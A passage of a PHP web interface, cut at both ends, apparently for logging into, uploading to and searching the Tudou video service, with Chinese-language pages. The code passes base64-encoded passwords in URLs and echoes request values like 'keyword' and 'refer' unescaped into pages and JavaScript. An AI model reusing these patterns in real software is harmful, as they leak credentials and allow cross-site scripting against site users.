                        echo "<a style='color:#000000' href='".httppath()."?api=tudou&action=".encodeuri(trim(request('action')))."&pagesize=".encodeuri($pagesize)."&page=".($page-1)."&skin=".$skincolor."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."'>上一页</a> ";
                if (floor($page)>0 && floor($page)<floor($totalpage))
                        echo "<a style='color:#000000' href='".httppath()."?api=tudou&action=".encodeuri(trim(request('action')))."&pagesize=".encodeuri($pagesize)."&page=".($page+1)."&skin=".$skincolor."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."'>下一页</a> ";
                				?>
                				<input name="page" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;" <?php  $style->textarea("#FCFC9D",""); ?>>
												<input type="submit" class="button" name="gotopage" value=" Go ">                 
                				<?php 
                //$gotopage = New PageChange();
                //$gotopage->CallPageChange();
                ?>
                </td>
        </tr>   
</table>
<?php 
                //$gotopage->gotopage($totalpage,httppath()."?api=tudou&action=".encodeuri(trim(request('action')))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&gopage=ok&page=","X3193","请在空白处输入要转到的页数");
                break;
        case "media.user":
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("tudou");
}
                        $_SESSION["tudou"] = array('uname' => '', 'pwd' => '');                 
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action"))));
                        break;
                }
                elseif ($_SESSION["tudou"]["uname"] != "" && $_SESSION["tudou"]["pwd"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(base64_encode(trim($_SESSION["tudou"]["uname"])))."&pwd=".encodeuri(base64_encode(trim($_SESSION["tudou"]["pwd"])))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode")));
                        break;
                }               
                elseif (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                if (trim(request("checkcode")) != ""){
                                			if(!is_wap()){
                                        AlertBack("四位验证码错误！" , 1);
                                        break;
                                      }  
                                      else{ 
                                    	?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											四位验证码错误！
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>返回</a>
                </td>
        </tr>  
</table> 
																			<?php 
                        								break;
                                      }
                                }       
                                elseif (trim(request("checkcode")) == ""){
                                			if(!is_wap()){
                                        AlertBack("四位验证码错误！" , 1);
                                        break;
                                      }  
                                      else{ 
                                    	?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											四位验证码为空！
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>返回</a>
                </td>
        </tr>  
</table> 
																			<?php 
                        								break;
                                      }
                               }               
                        }

                        
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("tudou");
}
                        $_SESSION["tudou"]=array('uname' => base64_decode(trim(request("uname"))), 'pwd' => base64_decode(trim(request("pwd"))));
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(Base64_encode(trim($_POST["pwd"])))."&action=".encodeuri(trim(request("action")))."&checkcode=".trim(request("checkcode")));
                        break;
                }       
                elseif (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=&pwd=&action=".encodeuri('media.login')."&checkcode=".trim(request("checkcode")));
                        break;
                }
               	$tudou_media = new tudou_class();
                //print_r($mediaulist);
                break;
        case "media.create":
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("tudou");
}
                        $_SESSION["tudou"] = array('uname' => '', 'pwd' => '');                 
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action"))));
                        break;
                }
                elseif ($_SESSION["tudou"]["uname"] != "" && $_SESSION["tudou"]["pwd"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(trim($_SESSION["tudou"]["uname"]))."&pwd=".encodeuri(trim($_SESSION["tudou"]["pwd"]))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode")));
                        break;
                }               
                elseif (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                if (trim(request("checkcode")) != ""){
                                			if(!is_wap()){
                                        AlertBack("四位验证码错误！" , 1);
                                        break;
                                      }  
                                      else{
                                    	?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											四位验证码错误！
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>返回</a>
                </td>
        </tr>  
</table> 
																			<?php 
                        								break;
                                      }
                                }       
                                elseif (trim(request("checkcode")) == ""){
                                        AlertBack("四位验证码为空！" , 1);
                                        break;
                                }               
                        }

                        
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("tudou");
}
                        $_SESSION["tudou"]=array('uname' => base64_encode(trim(request("uname"))), 'pwd' => base64_encode(trim(request("pwd"))));
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(Base64_encode(trim($_POST["pwd"])))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode")));
                        break;
                }       
                elseif (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=&pwd=&action=".encodeuri('media.login')."&checkcode=".trim(request("checkcode")));
                        break;
                }               

        	if (trim(request("mediapath")) == "" && !is_uploaded_file($_FILES['mediapath']['tmp_name'])){
                	?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%"> [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=tudou&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri(trim('media.ulist'))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))?>" target=_self>用户</a> - <?php echo Base64_decode(trim($_SESSION["tudou"]["uname"]));?> <?php  if (trim($_SESSION["tudou"]["uname"]) != "" && trim($_SESSION["tudou"]["pwd"]) != "") {?> - <a style="color:#000000;"href="<?php echo scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("uname"))))."&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&logout=1";?>" target="_self">退出</a><?php  } ?> ] </td>
        </tr>
</table>
<table width="95%" height="40" align="center" valign="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <form enctype="multipart/form-data" action="<?php echo ScriptPath();?>?api=tudou&action=<?php echo encodeuri("media.create")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor;?>&refer=<?php echo encodeuri(trim($_SERVER['HTTP_REFERER']));?>&classid=<?php echo trim(request("calssid"));?>&post=1" method="post" name="tudou">
        <tr>
                <td align="center" width="60%" height="20">
                        媒体路径：
                        <input <?php  $style->textarea("#FCFC9D","");?> style="width:60%;height:22px;" type="file" name="mediapath" id="mediapath" value="<?php echo trim(request("mediapath"));?>" />
                </td>
                <td align="center" width="40%">
                        验证码：
                        <input <?php  $style->textarea("#FCFC9D","");?> style="width:46%;height:22px" type="text" maxlength="4" id="checkcode" name="checkcode" maxlength="11" onKeyUp="value=value.replace(/[^0-9a-zA-Z,]/g,'')" value="" />
                        &nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="15" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="center" width="40%">
                        <input id=bsubmit value="上传图片！" type="submit" />
                </td>
        </tr>   
</table>
                	<?php 
                }
        	elseif (trim($_GET["post"]) != ""){
                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                if (trim(request("checkcode")) != ""){
                                			if(!is_wap()){
                                        AlertBack("四位验证码错误！" , 1);
                                        break;
                                      }  
                                      else{
                                    	?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											四位验证码错误！
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>返回</a>
                </td>
        </tr>  
</table> 
																			<?php 
                        								break;
                                      }
                                }       
                                elseif (trim(request("checkcode")) == ""){
                                        AlertBack("四位验证码为空！" , 1);
                                        break;
                                }               
                        }


									$content = 'X3193';	
									$tags = 'X3193';	
									$title = 'X3193';	
									$channelId = '10';
									$tudou_media = new tudou_class();
               		$mediaupload = $tudou_media->tudoumediaupload(base64_decode($_SESSION["tudou"]["uname"]),base64_decode($_SESSION["tudou"]["pwd"]),$content,$tags,$title,$channelId,$_FILES);
									
						$timeout = "5000";
		                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           
                		<?php 
                		if ($mediaupload['result'] != 'ok' && $mediaupload['content'] != 'ok'){
                			   if(!is_wap()){
                		?>
        <tr class="tdbg">
                <td align="center" id="result">
                        视频上传失败！<?php echo ($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
                		<?php       
                        		echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";                                
                        		break;
                        	}
                        	else{
                		?>
        <tr class="tdbg">
                <td align="center" id="result">
                        视频上传失败！<?php echo ($timeout/1000)?> <a href="<?php  echo trim(request("refer"))?>">返回上一页</a>
                </td>
        </tr>   
                		<?php  
                        	}
                		}
                		elseif ($mediaupload['result'] == 'ok' && $mediaupload['content'] == 'ok'){
                			   if(!is_wap()){                			
                		?>
        <tr class="tdbg">
                <td align="center" id="result">
                        视频上传成功！<?php echo ($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
                        		<?php       
                        		echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";                                
                        	}
                        	else{
                		?>
        <tr class="tdbg">
                <td align="center" id="result">
                        视频上传成功！<?php echo ($timeout/1000)?> <a href="<?php  echo trim(request("refer"))?>">返回上一页</a>
                </td>
        </tr>   
                		<?php  
                        	}                
                		}       
                		?>
</table>                        
                		<?php               
                }
                break;
        case "media.search":
								//redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(base64_encode(trim($_SESSION["tudou"]["uname"])))."&pwd=".encodeuri(base64_encode(trim($_SESSION["tudou"]["pwd"])))."&action=".encodeuri(trim("media.ulist"))."&checkcode=".trim(request("checkcode")));        				
        				//EXIT;
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("tudou");
}
                        $_SESSION["tudou"] = array('uname' => '', 'pwd' => '');                 
                        redirect(scriptpath()."?api=tudou&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action"))));
                        break;
                }        
        		if(trim($_POST['keyword']) != '' && trim($_GET['keyword']) == '' ){
                                redirect(httppath()."?api=tudou&action=".encodeuri('media.search')."&keyword=".encodeuri(trim(request('keyword')))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&page=".encodeuri($page)."&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder'))));
        		}
        		?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="center" height="35" class="tdtbg" valign="middle">
                        <form action="<?php echo ScriptPath();?>?api=tudou&action=<?php echo encodeuri('media.search');?>" method="post" name="tudou">
                        <input name="keyword" value="<?php  echo trim(request("keyword")); ?>" style="height:20px;width:90px;font-size:11px;" <?php  $style->textarea("#FCFC9D",""); ?>>
                        <SELECT name="mediaclassid" size="1" <?php  $style->selectarea("#FCFC9D",""); ?> style="width:75px;height:16px;font-size:12px">
                        <?php 
                        $tudou_media = new tudou_class();
	          	$mediaclassid = $tudou_media->tudoumediaclassid();
			?>
                        <OPTION VALUE="<?php  echo $mediaclassid[0]['code'];?>">视频分类</OPTION>
                        <?php 
	          	//print_r($mediaclassid);
                        for($i = 0; $i < count($mediaclassid);$i++){
                        ?>
                                <OPTION VALUE="<?php  echo $mediaclassid[$i]['code'];?>" <?php  if (trim(request('mediaclassid')) == $mediaclassid[$i]['code']) echo 'selected';?>><?php  echo $mediaclassid[$i]['type'];?></OPTION>
                        <?php 
                        }
                        ?>
                        <OPTION VALUE="<?php  echo $mediaclassid[0]['code'];?>">默认...</OPTION>
                        </SELECT>

                        <SELECT name="mediaday" size="1" <?php  $style->selectarea("#FCFC9D",""); ?> style="width:75px;height:16px;font-size:12px">
                        <?php 
                        $tudou_media = new tudou_class();
	          	$mediaday = $tudou_media->tudoumediaday();
			?>
                        <OPTION VALUE="<?php  echo $mediaday[0]['day'];?>">发布时间</OPTION>
                        <?php 
                        for($i = 0; $i < count($mediaday);$i++){
                        ?>
                                <OPTION VALUE="<?php  echo $mediaday[$i]['day'];?>" <?php  if (trim(request('mediaday')) == $mediaday[$i]['day']) echo 'selected';?>><?php  echo $mediaday[$i]['name'];?></OPTION>
                        <?php 
                        }
                        ?>
                        <OPTION VALUE="<?php  echo $mediaday[0]['day'];?>">默认...</OPTION>
                        </SELECT>

                        <SELECT name="mediatime" size="1" <?php  $style->selectarea("#FCFC9D",""); ?> style="width:75px;height:16px;font-size:12px">
                        <?php 
                        $tudou_media = new tudou_class();
	          	$mediatime = $tudou_media->tudoumediatime();
			?>
                        <OPTION VALUE="<?php  echo $mediatime[0]['time'];?>">播放时间</OPTION>
                        <?php 
                        for($i = 0; $i < count($mediatime);$i++){
                        ?>
                                <OPTION VALUE="<?php  echo $mediatime[$i]['time'];?>" <?php  if (trim(request('mediatime')) == $mediatime[$i]['time']) echo 'selected';?>><?php  echo $mediatime[$i]['name'];?></OPTION>
                        <?php 
                        }
                        ?>
                        <OPTION VALUE="<?php  echo $mediatime[0]['time'];?>">默认...</OPTION>
                        </SELECT>

                        <SELECT name="mediatype" size="1" <?php  $style->selectarea("#FCFC9D",""); ?> style="width:75px;height:16px;font-size:12px">
                        <?php 
                        $tudou_media = new tudou_class();
	          	$mediatype = $tudou_media->tudoumediatype();
			?>
                        <OPTION VALUE="<?php  echo $mediatype[0]['type'];?>">媒体类型</OPTION>
                        <?php 
                        for($i = 0; $i < count($mediatype);$i++){
                        ?>
                                <OPTION VALUE="<?php  echo $mediatype[$i]['type'];?>" <?php  if (trim(request('mediatype')) == $mediatype[$i]['type']) echo 'selected';?>><?php  echo $mediatype[$i]['name'];?></OPTION>
                        <?php 
                        }
                        ?>
                        <OPTION VALUE="<?php  echo $mediatype[0]['type'];?>">默认...</OPTION>
                        </SELECT>

                        <SELECT name="mediaorder" size="1" <?php  $style->selectarea("#FCFC9D",""); ?> style="width:75px;height:16px;font-size:12px">
                        <?php 
                        $tudou_media = new tudou_class();
	          	$mediaorder = $tudou_media->tudoumediaorder();
			?>
                        <OPTION VALUE="<?php  echo $mediaorder[0]['order'];?>">媒体排序</OPTION>
                        <?php 
                        for($i = 0; $i < count($mediaorder);$i++){
                        ?>
                                <OPTION VALUE="<?php  echo $mediaorder[$i]['order'];?>" <?php  if (trim(request('mediaorder')) == $mediaorder[$i]['order']) echo 'selected';?>><?php  echo $mediaorder[$i]['name'];?></OPTION>
                        <?php 
                        }
                        ?>
                        <OPTION VALUE="<?php  echo $mediaorder[0]['order'];?>">默认...</OPTION>
                        </SELECT>

                        <input type="text" name="pagesize" value="<?php echo $pagesize?>" style="width:19px;height:19px;font-size:12px" <?php  $style->textarea("#FCFC9D","") ?>>
                        <input type="hidden" class="text" name="skin" value="<?php echo $skincolor;?>" size="1"> 
                        <input type="submit" class="button" name="btnSubmit" value=" Go ">
                        <?php 
                      	if($_SESSION["tudou"]["uname"] != '' && $_SESSION["tudou"]["pwd"] != ''){
                      	?>
                        &nbsp;<a style="color:#000000" href="<?php echo ScriptPath()."?api=tudou&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim($_SESSION["tudou"]["uname"]))."&pwd=".encodeuri(trim($_SESSION["tudou"]["pwd"]))."&skin=".$skincolor."&action=".encodeuri(trim('media.ulist'))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))?>" target=_self>用户</a>
                      	<?php 	
                      	}	
                        else{
                        ?>
                        &nbsp;<a  style="color:#000000" href="?api=tudou&action=<?php echo encodeuri('media.login');?>&skin=<?php echo $skincolor;?>" title="上传视频到土豆服务器">登入</a>
                        <?php 
                      	}
                        ?>
                </td>
        </tr>   
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
	  <?php 
	  	if(trim(request('keyword')) != ''){
                	$tudou_media = new tudou_class();
                	$medialist = $tudou_media->tudoumedialist(trim(request('keyword')),trim(request('mediaclassid')),trim(request('mediaday')),trim(request('mediatime')),trim(request('mediatype')),trim(request('mediaorder')),trim(request('page')),trim(request('pagesize')));
               		//print_r($medialist);
               		//return;
               		
	              	if ($medialist['length'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $medialist['length'];
	              	if($medialist['forbidflag']=='1'){
										?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"> 查 询 结 果 </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="tudou" method="post" action="">
        <tr class="tdbg">
                <td align="center" width=100%>
										未搜索到任何相关内容！
                </td>   
        </tr>
</table>								
										<?php 	              	
	              	}
	              	else{
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"> 查 询 结 果 : 共 <?php echo $medialist['length'];?> 条 </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="live" method="post" action="">
                <?php 
                $totalitem = $medialist['length'];
                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }       
                if ($totalpage == $page)
                        $endid = $totalitem-1;
                elseif ($totalpage > $page)
                        $endid = floor($strpagesize*($page)-1);
                elseif ($totalpage < $page){
                        $endid = floor($strpagesize*($page-1)-1);
                }                       
                ?>
        <tr class="tdbg">
                <td align="center" width=4%>
                        <input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" />
                </td>   
                <td align="center" width=10%>
                        标题
                </td>
                <td align="center" width=15%>
                        标签
                </td>
                <td align="center" width=15%>
                        用户名（昵称/ID）
                </td>
                <td align="center" width=15%>
                        状态
                </td>
                <td align="center" width=20%>
                        搜索 可用 无效 满载
                </td> 
        </tr>
                <?php 
                for($i = 0; $i < $strpagesize; $i++){
                        $mediatitle = $medialist[$i]['mediatitle'];//iconv('utf-8','gb2312',$objHdd->getElementsByTagName('domainName')->item(0)->nodeValue);
                        $mediatags = $medialist[$i]['mediatags'];//iconv('utf-8','gb2312',$objHdd->getElementsByTagName('active')->item(0)->nodeValue);
                        $mediaownername = $medialist[$i]['mediaownername'];//iconv('utf-8','gb2312',$objHdd->getElementsByTagName('numUsers')->item(0)->nodeValue);
                        $mediaownernickname = $medialist[$i]['mediaownernickname'];//iconv('utf-8','gb2312',$objHdd->getElementsByTagName('maxUsers')->item(0)->nodeValue);
                        $mediaownerid = $medialist[$i]['mediaownerid'];//iconv('utf-8','gb2312',$objHdd->getElementsByTagName('maxUsers')->item(0)->nodeValue);
                        $mediaplayerurl = $medialist[$i]['mediaplayerurl'];
                        $mediaitemurl = $medialist[$i]['mediaitemurl'];
                        $mediatype = $medialist[$i]['mediatype'];
                        $mediadescription = $medialist[$i]['mediadescription'];
                        $mediapicurl = $medialist[$i]['mediapicurl'];
                        $mediatime = $medialist[$i]['mediatime'];
                        $mediacreatetime = $medialist[$i]['mediacreatetime'];
                        $mediaclass = $medialist[$i]['mediaclass'];
                        $mediachecked = $medialist[$i]['mediachecked'];
                        $mediaitemcode = $medialist[$i]['itemCode'];
                        ?>
        <tr class="tdbg">
                <td align="center">
                        <input type="checkbox" name="chidd<?php echo $i;?>" id="chidd<?php echo $i;?>" value="chidd<?php echo $i;?>" />
                </td>   
                <td align="center">
                <?php 
                        $tudou_media = new tudou_class();
               		$mediaviewer = $tudou_media->tudouviewer();
               		if($mediaviewer){
                ?>
                        <?php echo "<a style=\"color:#000000\" href=\"http://www.tudou.com/v/".trim($mediaitemcode)."/&cbs=2&vbc=9&autoPlay=true/v.swf\" target=\"_blank\">".$mediatitle."</a>";?>
                <?php 
			}
               		else{
                ?>
                        <?php echo "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=tudou&action=".encodeuri("media.view")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&mediacode=".encodeuri($mediaitemcode)."&keyword=".encodeuri(trim(request('keyword')))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&page=".encodeuri($page)."&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder')))."\">".$mediatitle."</a>";?>
                <?php                		
               		}
                ?>  
                </td>
                <td align="center">
			<?php 
			$str = array();
			$str = split(",",$mediatags);
			$array_size = count($str);
			//echo $array_size;
			while(!(--$array_size < 0)){ 
				echo "<a style='color:#000000' href='".httppath()."?api=tudou&action=".trim(request("action"))."&keyword=".encodeuri(trim($str[$array_size]))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&page=1&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder')))."'>".$str[$array_size]."</a> ";
			}	
			?>
                </td>
                <td align="center">
                        <?php echo $mediaownername."(".$mediaownernickname."/".$mediaownerid.")";?>
                </td>
                <td align="center">
                        <?php echo $domainstatus=='true'?"可用":"无效";?>
                </td>
                <td align="center">
                        <?php echo "<a style=\"color:#000000\" href=\"".ScriptPath()."?api=live&action=".encodeuri("account.create")."&authdata=".encodeuri(trim(request("authdata")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domainname=".encodeuri($domainname)."\">查看</a>";?> 下载 
                </td>
        </tr>   
                	<?php 
                }
                ?>
                </td>
        </tr>           
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" colspan="3"> 共 <?php  echo $totalpage;?> 页 第  
                <?php 
                echo $page." 页 ".$sCrLf;
                if (floor($page)>1)
                        echo "<a style='color:#000000' href='".httppath()."?api=tudou&action=".trim(request("action"))."&keyword=".encodeuri(trim(request('keyword')))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&page=".($page-1)."&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder')))."'>上一页</a> ";
                if (floor($page)>0 && floor($page)<floor($totalpage))
                        echo "<a style='color:#000000' href='".httppath()."?api=tudou&action=".trim(request("action"))."&keyword=".encodeuri(trim(request('keyword')))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&page=".($page+1)."&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder')))."'>下一页</a> ";

                $gotopage = New PageChange();
                $gotopage->CallPageChange();
                ?>
                </td>
        </tr>   
</table>
<?php 
                $gotopage->gotopage($totalpage,httppath()."?api=tudou&action=".trim(request("action"))."&keyword=".encodeuri(trim(request('keyword')))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder')))."&gopage=ok&page=","X3193","请在空白处输入要转到的页数");
        		}
        	}
                break; 
        case "media.view":
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("tudou");
}
                        $_SESSION["tudou"] = array('uname' => '', 'pwd' => '');                 
                        GoBack('1');
                        break;
                }        
        ?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="center" height="35" class="tdtbg" valign="middle">
                        <form action="<?php echo ScriptPath();?>?api=tudou&action=<?php echo encodeuri('media.search');?>" method="post" name="tudou">
                        <input name="keyword" value="<?php  echo trim(request("keyword")); ?>" style="height:20px;width:90px;font-size:11px;" <?php  $style->textarea("#FCFC9D",""); ?>>
                        <SELECT name="mediaclassid" size="1" <?php  $style->selectarea("#FCFC9D",""); ?> style="width:75px;height:16px;font-size:12px">
                        <?php 
                        $tudou_media = new tudou_class();
	          						$mediaclassid = $tudou_media->tudoumediaclassid();
												?>
                        <OPTION VALUE="<?php  echo $mediaclassid[0]['code'];?>">视频分类</OPTION>
                        <?php 
	          	//print_r($mediaclassid);
                        for($i = 0; $i < count($mediaclassid);$i++){
                        ?>
                                <OPTION VALUE="<?php  echo $mediaclassid[$i]['code'];?>" <?php  if (trim(request('mediaclassid')) == $mediaclassid[$i]['code']) echo 'selected';?>><?php  echo $mediaclassid[$i]['type'];?></OPTION>
                        <?php 
                        }
                        ?>
                        <OPTION VALUE="<?php  echo $mediaclassid[0]['code'];?>">默认...</OPTION>
                        </SELECT>

                        <SELECT name="mediaday" size="1" <?php  $style->selectarea("#FCFC9D",""); ?> style="width:75px;height:16px;font-size:12px">
                        <?php 
                        $tudou_media = new tudou_class();
	          	$mediaday = $tudou_media->tudoumediaday();
			?>
                        <OPTION VALUE="<?php  echo $mediaday[0]['day'];?>">发布时间</OPTION>
                        <?php 
                        for($i = 0; $i < count($mediaday);$i++){
                        ?>
                                <OPTION VALUE="<?php  echo $mediaday[$i]['day'];?>" <?php  if (trim(request('mediaday')) == $mediaday[$i]['day']) echo 'selected';?>><?php  echo $mediaday[$i]['name'];?></OPTION>
                        <?php 
